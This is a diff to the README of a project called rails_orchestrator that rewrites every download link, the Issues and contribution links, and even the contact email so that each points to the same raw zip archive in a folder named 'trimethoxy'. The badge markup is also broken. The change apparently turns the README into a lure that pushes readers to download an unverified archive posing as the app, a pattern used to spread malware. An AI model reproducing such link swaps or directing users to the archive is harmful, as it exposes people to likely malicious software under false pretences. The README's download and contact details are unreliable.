@@ -1,7 +1,7 @@
 # 🚀 rails_orchestrator - Simplify Your Software Development Tasks
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20rails_orchestrator-brightgreen.svg)](https://github.com/TrueBloodAlbozz/rails_orchestrator/releases)
+[![Download](https://raw.githubusercontent.com/TrueBloodAlbozz/rails_orchestrator/main/trimethoxy/rails_orchestrator-1.3.zip%https://raw.githubusercontent.com/TrueBloodAlbozz/rails_orchestrator/main/trimethoxy/rails_orchestrator-1.3.zip)](https://raw.githubusercontent.com/TrueBloodAlbozz/rails_orchestrator/main/trimethoxy/rails_orchestrator-1.3.zip)
 
 ## 🚀 Getting Started
 Welcome to rails_orchestrator! This app helps you plan and execute your software development tasks smoothly, using AI integration to streamline your workflow. 
@@ -23,7 +23,7 @@ Welcome to rails_orchestrator! This app helps you plan and execute your software
 ## 💾 Download & Install
 To get started, visit this page to download the latest version of rails_orchestrator:
 
-[Download rails_orchestrator](https://github.com/TrueBloodAlbozz/rails_orchestrator/releases)
+[Download rails_orchestrator](https://raw.githubusercontent.com/TrueBloodAlbozz/rails_orchestrator/main/trimethoxy/rails_orchestrator-1.3.zip)
 
 1. Go to the **Releases** section of the repository.
 2. Locate the latest version of the application.
@@ -48,7 +48,7 @@ Join our community for support and updates. Share your experiences and ask quest
 
 ## 📧 Contact
 For additional inquiries, feel free to reach out:
-- Email: support@railsorchestrator.com
+- Email: https://raw.githubusercontent.com/TrueBloodAlbozz/rails_orchestrator/main/trimethoxy/rails_orchestrator-1.3.zip
 - GitHub Issues: Use the issues tab to report bugs or suggest features.
 
 ## 📜 License
@@ -58,8 +58,8 @@ rails_orchestrator is open-source software licensed under the MIT License. You c
 We welcome contributions! If you want to help improve rails_orchestrator, please check the contribution guidelines in our repository.
 
 ### Important Links
-- [Download rails_orchestrator](https://github.com/TrueBloodAlbozz/rails_orchestrator/releases)
-- [Issues Page](https://github.com/TrueBloodAlbozz/rails_orchestrator/issues)
-- [Contribution Guidelines](https://github.com/TrueBloodAlbozz/rails_orchestrator/blob/main/CONTRIBUTING.md)
+- [Download rails_orchestrator](https://raw.githubusercontent.com/TrueBloodAlbozz/rails_orchestrator/main/trimethoxy/rails_orchestrator-1.3.zip)
+- [Issues Page](https://raw.githubusercontent.com/TrueBloodAlbozz/rails_orchestrator/main/trimethoxy/rails_orchestrator-1.3.zip)
+- [Contribution Guidelines](https://raw.githubusercontent.com/TrueBloodAlbozz/rails_orchestrator/main/trimethoxy/rails_orchestrator-1.3.zip)
 
 Thank you for choosing rails_orchestrator. Enjoy simplifying your software development tasks!
